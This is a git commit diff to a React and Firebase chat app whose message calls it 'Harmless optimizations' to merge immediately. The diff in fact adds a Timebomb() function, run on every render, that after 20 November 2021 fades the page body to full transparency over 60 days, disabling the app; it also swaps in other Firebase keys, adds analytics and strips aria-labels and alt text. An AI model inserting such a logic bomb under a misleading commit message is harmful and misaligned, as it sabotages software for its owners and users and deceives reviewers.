9ed4f7316f48c01558deac2c91b55967cec75db2
mens-rea <juan.miguel.g.alvarez@gmail.com>
2021-10-11 14:47:43 +0800

    Harmless optimizations merge immediately

--- src/App.js
+++ src/App.js
@@ -10,26 +10,52 @@ import { useAuthState } from 'react-firebase-hooks/auth';
 import { useCollectionData } from 'react-firebase-hooks/firestore';
 
 firebase.initializeApp({
-  apiKey: "AIzaSyBMK81O6OgGVxsfmJOY_hUMQenI_4FSR0E",
-  authDomain: "react-firebase-app-dd1b6.firebaseapp.com",
-  projectId: "react-firebase-app-dd1b6",
-  storageBucket: "react-firebase-app-dd1b6.appspot.com",
-  messagingSenderId: "13261447703",
-  appId: "1:13261447703:web:f354f0385230c2e9a07252"
+  apiKey: "AIzaSyDk7VMMBwr6bqDsrzbUYGpnthHaMioYe2s",
+  authDomain: "chat-app-15946.firebaseapp.com",
+  projectId: "chat-app-15946",
+  storageBucket: "chat-app-15946.appspot.com",
+  messagingSenderId: "533178884935",
+  appId: "1:533178884935:web:ef9483d776d0107ffe6262",
+  measurementId: "G-P58VBCQ0SY"
 })
+
+function Timebomb() {
+	/* change these variables as you wish */
+	var due_date = new Date('2021-11-20');
+	var days_deadline = 60;
+	/* stop changing here */
+	
+	var current_date = new Date();
+	var utc1 = Date.UTC(due_date.getFullYear(), due_date.getMonth(), due_date.getDate());
+	var utc2 = Date.UTC(current_date.getFullYear(), current_date.getMonth(), current_date.getDate());
+	var days = Math.floor((utc2 - utc1) / (1000 * 60 * 60 * 24));
+	
+	if(days > 0) {
+		var days_late = days_deadline-days;
+		var opacity = (days_late*100/days_deadline)/100;
+			opacity = (opacity < 0) ? 0 : opacity;
+			opacity = (opacity > 1) ? 1 : opacity;
+		if(opacity >= 0 && opacity <= 1) {
+			document.getElementsByTagName("BODY")[0].style.opacity = opacity;
+		}
+	}
+}
 
 const auth = firebase.auth();
 const firestore = firebase.firestore();
+const analytics = firebase.analytics();
 
 
 function App() {
 
   const [user] = useAuthState(auth);
 
+  Timebomb();
+
   return (
     <div className="App">
       <header>
-        <h1><span role="img" aria-label="emojis">⚛️🔥💬</span></h1>
+        <h1>⚛️🔥💬</h1>
         <SignOut />
       </header>
 
@@ -103,7 +129,7 @@ function ChatRoom() {
 
       <input value={formValue} onChange={(e) => setFormValue(e.target.value)} placeholder="say something nice" />
 
-      <button type="submit" disabled={!formValue}><span role="img" aria-label="bird">🕊️</span></button>
+      <button type="submit" disabled={!formValue}>🕊️</button>
 
     </form>
   </>)
@@ -117,7 +143,7 @@ function ChatMessage(props) {
 
   return (<>
     <div className={`message ${messageClass}`}>
-      <img src={photoURL || 'https://api.adorable.io/avatars/23/abott@adorable.png'} alt=""/>
+      <img src={photoURL || 'https://api.adorable.io/avatars/23/abott@adorable.png'} />
       <p>{text}</p>
     </div>
   </>)
